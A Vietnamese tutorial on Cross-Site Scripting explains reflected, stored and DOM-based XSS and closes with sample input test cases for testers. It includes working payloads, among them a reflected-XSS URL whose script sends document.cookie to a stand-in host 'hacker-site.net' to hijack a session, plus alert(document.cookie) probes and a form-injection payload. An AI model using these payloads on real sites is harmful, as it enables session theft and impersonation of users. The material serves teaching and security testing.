Cross-Site Scripting (XSS) là một trong những kỹ thuật tấn công phổ biến nhất hiên nay, đồng thời nó cũng là một trong những vấn đề bảo mật quan trọng đối với các nhà phát triển web và cả những người sử dụng web. Bất kì một website nào cho phép người sử dụng đăng thông tin mà không có sự kiểm tra chặt chẽ các đoạn mã nguy hiểm thì đều có thể tiềm ẩn các lỗi XSS. Kỹ thuật tấn công này được mệnh danh là Godfather of Attack, và trong nhiều năm liền được liệt vào danh sách những kỹ thuật tấn công nguy hiểm nhất với ứng dụng web. Mối nguy hiểm từ XSS đã ngày càng được mọi người chú ý hơn.

### 1. XSS là gì?
Cross-Site Scripting hay còn được gọi tắt là XSS (thay vì gọi tắt là CSS để tránh nhầm lẫn với CSS-Cascading Style Sheet của HTML) là kỹ thuật tấn công bằng cách chèn vào các website những đoạn mã script nguy hiểm như javascript hoặc HTML. Thông thường, các cuộc tấn công XSS được thực thi ở phía client, vượt qua quyền kiểm soát truy cập, chiếm phiên đăng nhập và mạo danh người dùng.
### 2. XSS hoạt động như thế nào?
Về cơ bản XSS cũng tương tự SQL Injection (như bài viết trước mình đã chia sẻ), nó là các request được gửi từ máy client tới server nhằm chèn vào đó các thông tin vượt quá tầm kiểm soát của server. Nó có thể là request được gửi từ các form dữ liệu đầu vào hoặc từ các URL.

Nếu như các kỹ thuật tấn công khác có thể làm thay đổi được dữ liệu nguồn của web server (source code, cấu trúc, Database) thì XSS chỉ gây tổn hại đối với website ở phía client nên sẽ gây hậu quả trực tiếp cho người dùng. Tất nhiên đôi khi hacker cũng sử dụng kỹ thuật này để deface các website nhưng đó vẫn chỉ tấn công vào bề mặt của website. Thật vậy, XSS là những Client-Side Script, những đoạn mã này chỉ chạy trên trình duyệt phía client. Do đó XSS không làm ảnh hưởng đến hệ thống website nằm trên server.

Mục tiêu tấn công của XSS là những người dùng website, khi họ vô tình vào các trang có chứa các đoạn mã nguy hiểm do các hacker để lại họ có thể bị chuyển tới các website khác, đặt lại homepage, hay nặng hơn là mất mật khẩu, mất cookie thậm chí máy tính bạn có thể sẽ bị cài các loại virus, backdoor, worm ..
### 3. Các kiểu khai thác XSS
XSS nói chung được chia làm 3 loại chính là **Reflected, Stored và DOM based**. Trước khi tìm hiểu chi tiết, chúng ta cùng xét ví dụ sau: Một ứng dụng web cho phép in ra giá trị mà chúng ta truyền vào thông qua URL, giả sử truyền vào biến name giá trị Ping
![](https://images.viblo.asia/7b4739ca-1646-4e59-a9cd-7b6fce1356f5.png)
Xem lại source code html: 

![](https://images.viblo.asia/07f5cf45-23c8-4d83-9739-716f678d089f.png)

Điều dễ nhận thấy là giá trị được truyền vào ở trên đã chèn vào source code. Vấn đề sẽ trở nên nghiêm trọng nếu như giá trị được nhập vào không phải là một chuỗi bình thường như trên mà là một đoạn mã lệnh có khả năng gây nguy hiểm: `<script>alert(document.cookie)</script>`

Thử lại với giá trị trên:
![](https://images.viblo.asia/84cfd829-48f6-479d-82ac-02335bbd6464.png)

Như vậy biến *name* có thể nhận giá trị đầu vào bất kỳ và truyền lên server xử lý, server đã không kiểm soát giá trị đầu vào này trước khi trả về cho trình duyệt. Dẫn đến việc đoạn mã javascript đã bị chèn vào trong source code. 

Ví dụ đã minh chứng kỹ thuật XSS được thực hiện dựa trên việc chèn các đoạn script nguy hiểm vào trong source code ứng dụng web. Và thông qua 3 phương thức sau:
### 3.1. Reflected XSS
75% kỹ thuật XSS dựa trên Reflected XSS. Gọi là reflected bởi vì trong kịch bản khai thác, hacker gửi cho người dùng một URL có chứa đoạn mã nguy hiểm (thường là javascript). Người dùng chỉ cần request đến URL này thì ngay lập tức hacker sẽ nhận được respond chứa kết quả mong muốn (tính phản xạ thể hiện ở đây).

Có nhiều hướng để khai thác thông qua lỗi Reflected XSS, một trong những cách phổ biến nhất là chiếm phiên làm việc (session) của người dùng, từ đó có thể truy cập được dữ liệu và chiếm được quyền của họ trên website.

Kịch bản khai thác trong thực tế:

1. Người dùng đăng nhập web và giả sử được gán session:

    `Set-Cookie: sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4`    
2. Bằng cách nào đó, hacker gửi được cho người dùng URL sau

>     http://example.com/name=<script>var+i=new+Image;+i.src=”http://hacker-site.net/”%2bdocument.cookie;</script>

   Giả sử example.com là website nạn nhân truy cập, hacker-site.net là trang của hacker tạo ra   
   
3. Nạn nhân truy cập đến URL trên

4. Trình duyệt sẽ đưa người dùng đến trang web do hacker tạo ra . Server phản hồi cho nạn nhân, kèm với dữ liệu có trong request.

5. Trình duyệt nạn nhân nhận request và thực thi các đoạn script kèm theo

6. Đoạn javascript mà hacker tạo ra thực tế như sau:

    `var i=new Image; i.src=”http://hacker-site.net/”+document.cookie;`

    Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng:
    
    ```
    GET /sessId=5e2c648fa5ef8d653adeede595dcde6f638639e4e59d4 HTTP/1.1
    Host: hacker-site.net
    ```

7. Từ phía site của mình, hacker nhận được nội dung respond và coi như session của người dùng sẽ bị chiếm, có thể giả mạo nạn nhân và thực hiện mọi quyền trên website mà nạn nhân có.

    ![](https://images.viblo.asia/d6cecff5-3909-43d1-85d5-986d1f7d4389.jpg)

### 3.2. Stored XSS
Khác với Reflected, Stored XSS hướng đến nhiều nạn nhân hơn. Lỗi này xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào trước khi lưu vào database. Hacker sẽ thông qua các điểm đầu vào (form, textbox, textarea…) không được kiểm tra kỹ để chèn vào CSDL các đoạn mã nguy hiểm.

![](https://images.viblo.asia/4cb5ff5f-0a34-4ef9-971a-f1887219d04e.png)

Khi người dùng truy cập vào ứng dụng web và thực hiện các thao tác liên quan đến dữ liệu được lưu này, đoạn mã của hacker sẽ được thực thi trên trình duyệt người dùng.
![](https://images.viblo.asia/d0583d9f-e78c-45c8-ad59-017250eb918c.png)
Kịch bản khai thác được mô tả như hình sau:
![](https://images.viblo.asia/6ff3eb63-9561-4ce6-89b2-b9b709349f74.png)

Vì mã độc đã được lưu trong CSDL Web nên bất cứ khi nào người dùng truy cập các chức năng liên quan thì mã độc sẽ được thực thi. Nhiều khả năng là những chức năng này yêu cầu phải xác thực trước nên hiển nhiên trong thời gian này người dùng vẫn đang trong phiên làm việc và mục tiêu của hacker sẽ dễ dàng đạt được hơn. Cũng có thể người dùng không sử dụng chức năng đó, tuy nhiên sẽ có nhiều nạn nhân hơn so với Reflected. Đặc biệt, nếu nạn nhân có vai trò quản trị thì còn có nguy cơ chiếm quyền điều khiển web.

### 3.3. DOM Based XSS
Trước hết chúng ta cần biết DOM là gì ? DOM viết tắt của Document Object Model, được đưa ra nhằm để truy xuất và thao tác dữ liệu của tài liệu có cấu trúc như HTML, XML. DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML. Chúng ta cùng xem xét một ví dụ cụ thể sau:

Một website có URL đến trang đăng ký như sau: 

`http://example.com/register.php?message=Please fill in the form`

Khi truy cập đến thì chúng ta thấy một Form rất bình thường
![](https://images.viblo.asia/e67ae68d-943d-4972-8cef-2dba9ed00a8d.png)

Hacker sẽ chèn JavaScript có nhiệm vụ lấy giá trị từ tham số message và in ra. Từ việc kiểm tra đầu vào lỏng lẻo này, hoàn toàn có thể lừa người dùng truy cập các URL nguy hiểm.

Thay vì truyền `message=Please fill in the form` thì truyền tham số:

> message=<label>Gender</label><div class="col-sm-4"><select class = "form-control" onchange="java_script_:show()"><option value="Male">Male</option><option value="Female">Female</option></select></div><script>function show(){alert();}</script>

Form đăng ký sẽ biến đổi thành

![](https://images.viblo.asia/1d8f9cc5-38ba-42fe-ba2e-a4b6de952f79.png)

Người dùng sẽ chẳng chút nghi ngờ với một form “bình thường” như thế này, và khi lựa chọn giới tính, Script sẽ được thực thi

![](https://images.viblo.asia/4b6f6f29-414f-4d24-9fbf-efe6204da7e9.png)

Và cũng có thể thấy kịch bản khai thác thực tế, DOM Based có phần giống với Reflected hơn là Stored XSS khi phải lừa người dùng truy cập vào một URL đã nhúng mã độc.

Mô hình kỹ thuật tấn công DOM Based XSS

![](https://images.viblo.asia/a0bbe48c-7dc0-4ac3-8b01-140b1fb13a9b.png)

### 4. Ví dụ Testcase XSS
Vì XSS tấn công từ các form dữ liệu đầu vào hoặc từ các URL nên việc kiểm thử liên quan tới XSS là tập trung vào các item có thể nhập được dữ liệu. Do đó có thể bỏ qua các items: select box, dropdown box, radiobutton, checkbox...Tester cần quan tâm đến URL có truyền parameter (https://www.youtube.com/watch?v=0LHmevWVvpc thì watch?v=0LHmevWVvpc là param cần phải gán giá trị vào), URL không truyền param (http://blogdulich.vn/dia-diem-check-cho-cac-tin-song-ao-tai-ha-noi.html), và textbox/text area...

* EX1: Với URL có truyền parameter 

    Input: watch?v=<SCRIPT>alert(document.cookie)</SCRIPT>
    
    Expected: Không thực thi đoạn script trên, không hiển thị popup nào và hiển thị không tìm thấy trang
    
* EX2: URL không truyền param

    Input: <script>window.open("http://www.google.com/")</script>
    
    Expected: Không thực thi javascript (Không mở tab mới https://www.google.com.vn/) và hiển thị không tìm thấy trang
    
* EX3: Với Textbox

    Input1: <script>alert('Website đang bị lỗi XSS')</script>
    
    Expected1: Không hiển thị popup có nội dung "Website đang bị lỗi XSS", hiển thị chuỗi scriptalert(Website đang bị lỗi XSS)/script
    
    Input2: <EMBED SRC="helloworld.swf">
    
    Expected2: Không thực thi chuỗi html trên và hiển thị thành chuỗi: EMBED SRC="helloworld.swf"
    
    
Nguồn tham khảo: https://securitydaily.net